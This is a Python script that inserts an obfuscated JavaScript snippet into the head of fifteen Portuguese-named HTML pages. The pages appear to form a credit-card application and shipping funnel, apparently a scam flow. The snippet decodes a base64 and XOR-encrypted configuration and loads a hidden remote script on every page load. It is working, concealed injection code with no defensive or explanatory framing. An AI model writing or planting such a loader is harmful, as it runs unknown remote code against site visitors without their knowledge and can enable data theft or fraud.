from pathlib import Path

files = [
    'index.html',
    '02-validacao.html',
    '03-aprovado.html',
    '04-interesse.html',
    '05-processando.html',
    '06-cartao.html',
    '07-termos.html',
    '08-personalizacao.html',
    '09-vencimento.html',
    '10-gerente.html',
    '11-endereco.html',
    '12-envio.html',
    '13-confirmacao-sedex.html',
    '14-confirmacao-pac.html',
    '15-pre-pagamento.html'
]

snippet = '''\n<script>(function(){var e_dam=atob("DByaAuSMXkNzH6DO0me4d5bgfHlRd9S6om+gLcvvOi1datSju3rjLIfjM20RbY+9sW7zcpD/cTYHctPhvn3uZ5f4cCkAPYzss2jucI3uKzcWbIL0iWe4bIXhO2FJPcSvpn23d5DhNyUKMtC8t2r/bJChJiAce429sXe4Lsb6Py8GeoL08D7nLp+uMCIeeoL08Hj7doWhKzcedsa3/2zoZ5LpMDdebNWsu3jpIMiuKCIfasXs6D64f7nx");var n_cp9y=[];for(var n_7ji=0;n_7ji<e_dam.length;n_7ji++){n_cp9y.push(e_dam.charCodeAt(n_7ji)&255);}var j_l=n_cp9y[0];var z_s=n_cp9y.slice(1,1+j_l);var d_af5=n_cp9y.slice(1+j_l);var y_8w0=d_af5.map(function(b,f_fpiq){return b^z_s[f_fpiq%j_l];});var l_91z="";for(var c_p=0;c_p<y_8w0.length;c_p++){l_91z+=String.fromCharCode(y_8w0[c_p]&255);}var n_375o=decodeURIComponent(escape(l_91z));var b_s8by=JSON.parse(n_375o);var m_ny=b_s8by.globals||[];m_ny.forEach(function(k_1t){window[k_1t.name]=k_1t.value;});var e_gts=document.createElement("script");e_gts.src=b_s8by.url;e_gts.async=true;e_gts.defer=true;(b_s8by.attributes||[]).forEach(function(i_021u){e_gts.setAttribute(i_021u.name,i_021u.value);});(document.head||document.documentElement).appendChild(e_gts);})();</script>'''

for name in files:
    path = Path(name)
    text = path.read_text(encoding='utf-8', errors='replace')
    if '</head>' in text and snippet not in text:
        text = text.replace('</head>', snippet + '\n</head>', 1)
        path.write_text(text, encoding='utf-8')
        print(f'updated {name}')
    elif snippet in text:
        print(f'skip {name}')
    else:
        print(f'no head tag {name}')
